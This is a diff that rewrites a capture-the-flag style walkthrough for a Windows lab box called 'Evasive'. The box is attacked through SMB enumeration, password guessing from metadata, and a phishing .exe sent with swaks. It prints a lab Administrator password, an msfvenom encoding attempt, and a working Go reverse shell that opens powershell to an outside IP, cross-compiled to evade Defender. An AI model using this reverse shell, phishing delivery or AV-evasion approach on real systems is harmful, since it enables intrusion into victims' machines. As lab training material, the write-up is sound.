@@ -1,245 +1,170 @@
-# Evasive (Medium)
+# Evasive
 
-Credentials for Windows Dev Machine (I think for exploit crafting):
+**Difficulty:** Medium  
+**Category:** Windows, Phishing, Client-Side Attack  
+**Techniques:** SMB/SMTP enumeration, password guessing from metadata, phishing payload delivery, custom Go reverse shell for AV evasion
 
+## TL;DR
+
+Initial recon found SMTP, SMB, and HTTP open, with directory brute-forcing turning up nothing useful. Anonymous SMB access was more productive: an internal file revealed two users, Roger and Alfonso, along with a note that Alfonso was expecting a `.exe` from Roger by email, plus a default password pattern (`NewUser2024!`) that didn't work as-is. Metadata from an SMB file pinned the current year, and adjusting the password's year to match cracked Roger's real credentials. From there, a phishing `.exe` was crafted and emailed to Alfonso as Roger via `swaks`. A first payload built with `msfvenom` got no callback; a second attempt used a custom Go reverse shell, cross-compiled for Windows to slip past Defender. That didn't connect either, and switching the listener port produced an "invalid shell" error. The walkthrough ends there, mid-troubleshoot.
+
+## Full Walkthrough
+
+### Credentials Found
+
+A set of credentials for what looks like a Windows dev machine, possibly used for exploit crafting, surfaced during the engagement:
+
+```
 Administrator:g.xyX4-rX3@odAm*
+```
 
-ATTACK CHAIN :
+### Initial Enumeration
+
+The initial scan shows SMTP, POP3, IMAP, and submission open (worth noting for a phishing angle later), alongside HTTP and SMB.
 
 ![evasive screenshot 1](images/evasive/evasive-01.png)
 
-Smtp, pop3, imap, submission open (Interesting for phishing)
-
-http open
-
-SMB open
-
-HTTP ENUM
+HTTP enumeration:
 
 ![evasive screenshot 2](images/evasive/evasive-02.png)
 
-Directories?
-
-- Feroxbuster
+Feroxbuster turns up no directories:
 
 ![evasive screenshot 3](images/evasive/evasive-03.png)
 
-No dirs.
+### SMB Enumeration
 
-SMB ENUM
-
-- Enum4linux
+`enum4linux`:
 
 ![evasive screenshot 4](images/evasive/evasive-04.png)
 
-- Smbclient
+`smbclient`:
 
 ![evasive screenshot 5](images/evasive/evasive-05.png)
 
 ![evasive screenshot 6](images/evasive/evasive-06.png)
 
-Can we access btw?
+Checking whether a share is actually accessible:
 
 ![evasive screenshot 7](images/evasive/evasive-07.png)
 
-Yes.
-
-Let’s inspect
+It is. Inspecting its contents:
 
 ![evasive screenshot 8](images/evasive/evasive-08.png)
 
-2 information:
-
-- We know 2 users : Roger and Alfonso
-
-- Alfonso is waiting an .exe program via email from Roger.
+Two useful pieces of information turn up: two users, Roger and Alfonso, and a note that Alfonso is expecting an `.exe` program from Roger by email.
 
 ![evasive screenshot 9](images/evasive/evasive-09.png)
 
-We got a default password:
-
-NewUser2024!
-
-Can we check if Alfonso has the default password?
+A default password is also floating around: `NewUser2024!`. Testing it against Alfonso:
 
 ![evasive screenshot 10](images/evasive/evasive-10.png)
 
-Nope.
-
-We need to find some users, but how?
-
-- Port udp 161 is closed
-
-Rpcclient enumeration?
+No luck. More users are needed, but UDP 161 is closed, ruling out SNMP. RPC enumeration is tried next:
 
 ![evasive screenshot 11](images/evasive/evasive-11.png)
 
-Nope
-
-SMPT enum :
+Nothing there either. SMTP enumeration:
 
 ![evasive screenshot 12](images/evasive/evasive-12.png)
 
-Requires authentication
-
-Other ports?
+Requires authentication. A check for other open ports:
 
 ![evasive screenshot 13](images/evasive/evasive-13.png)
 
-No other ports
+Nothing further. SMTP authentication looks like the way in, needed to send a malicious `.exe` to Alfonso that phones back to the attacking host. Brute-forcing is off the table: the mail component has anti-brute-force protection, and Defender is running on the host. A search for stray `.txt`/`.pdf` files with Feroxbuster also comes up empty.
 
-We need SMTP authentication in order to proceed and send a malicious .exe program to Alfonso that will connect back to our system
+### Cracking the Password with Metadata
 
-We know that the mail component is equipped with an anti-bruteforce mechanism. 
-
-We can’t brute force.
-
-There is Defender running.
-
-Can we search for some .TXT,.PDF files with feroxbuster?
-
-Nope.
-
-Running exiftool :
+Running `exiftool` against a recovered file reveals the current year:
 
 ![evasive screenshot 14](images/evasive/evasive-14.png)
 
-We can see that we’re in 2025.
-
-The default password provided was 2024.
-
-What if we adjust the password to 2025 ?
-
-NewUser2025!
+The default password format used 2024. Adjusting it to match the current year gives `NewUser2025!`:
 
 ![evasive screenshot 15](images/evasive/evasive-15.png)
 
-Indeed Roger’s password is the one.
+Roger's password turns out to be exactly that.
 
-Now that we got credentials, we can send the .exe from Roger to Alfonso.
+### Building the Phishing Payload
 
- 1. Crafting the payload
+With valid SMTP credentials for Roger, the next step is sending Alfonso the `.exe` he's expecting.
 
-We’ll try with a simple .exe crafted with:
+**Attempt 1: msfvenom**
 
-- Msfvenom
-
-Encoded with shikata_ga_nai , iterations 10
+A simple payload encoded with `shikata_ga_nai`, 10 iterations:
 
 ![evasive screenshot 16](images/evasive/evasive-16.png)
 
-1. Create the body.txt
+Creating the email body:
 
-1.
 ![evasive screenshot 17](images/evasive/evasive-17.png)
 
-1. Start Penelope
+Starting a Penelope listener:
 
-1.
 ![evasive screenshot 18](images/evasive/evasive-18.png)
 
-1. Send the message with :
+Sending the message as Roger with `swaks`:
 
-1. Swaks
-
+```
 sudo swaks -t alfonso@winserver01.hs \
-
   --from roger@winserver01.hs \
-
   --attach @program.exe \
-
   --server 10.1.128.246 \
-
   --body @body.txt \
-
   --header "Subject: Program.exe" \
-
   --suppress-data \
-
   -ap
+```
 
 ![evasive screenshot 19](images/evasive/evasive-19.png)
 
-Let’s wait to see if the .exe will be opened
+No callback. The msfvenom payload needed replacing with something less likely to get flagged.
 
-Well, no output.
+**Attempt 2: a custom Go reverse shell**
 
-We have to change the rev shell.
+A minimal Go reverse shell, chosen because it's less likely to be caught by AV than a stock Meterpreter binary:
 
-At this point I had to check the Walkthrough cos I didn’t know what kind of revshell I should have done.
-
-It talks about a simple Go Revshell.
-
-This should not be easily detected by an AV.
-
-Let’s RDP on it and craft the payload:
-
-1. We make a file .go
-
+```go
 package main
 
 import (
-
     "net"
-
     "os/exec"
-
 )
 
 func main() {
-
     c, _ := net.Dial("tcp", "10.200.75.141:1234")
-
     cmd := exec.Command("powershell")
-
     cmd.Stdin = c
-
     cmd.Stdout = c
-
     cmd.Stderr = c
-
     cmd.Run()
-
 }
+```
 
 ![evasive screenshot 20](images/evasive/evasive-20.png)
 
-1. We can cross-compile it on Linux too, using
+Cross-compiling for Windows from Linux with `go build`, per [this guide](https://stackoverflow.com/questions/41566495/golang-how-to-cross-compile-on-linux-for-windows):
 
-1. go build
-
-To cross-compile, according to this forum :
-
-https://stackoverflow.com/questions/41566495/golang-how-to-cross-compile-on-linux-for-windows
-
-We need to use :
-
+```
 GOOS=windows GOARCH=386 \
-
   CGO_ENABLED=1 CXX=i686-w64-mingw32-g++ CC=i686-w64-mingw32-gcc \
-
   go build -o program.exe rev.go
+```
 
 ![evasive screenshot 21](images/evasive/evasive-21.png)
 
-And here we are.
-
-Let’s run again Penelope and send again the message with swaks :
+With the binary built, Penelope is started again and the message resent through `swaks`:
 
 ![evasive screenshot 22](images/evasive/evasive-22.png)
 
-Let’s wait
-
-Weird because we got no shell.
-
-Let’s modify the port in rev.go :
-
-- Port 4445
-
-Build again and send again :
+Still no shell. Adjusting the listener to port 4445, rebuilding, and resending:
 
 ![evasive screenshot 23](images/evasive/evasive-23.png)
 
-We got invalid shell.
+This time an "invalid shell" error comes back. The walkthrough ends here, mid-troubleshoot on the payload delivery.
 
-Why?
+---
+
+*Educational write-up from an authorized lab environment (HackSmarter). Not a guide for unauthorized access.*
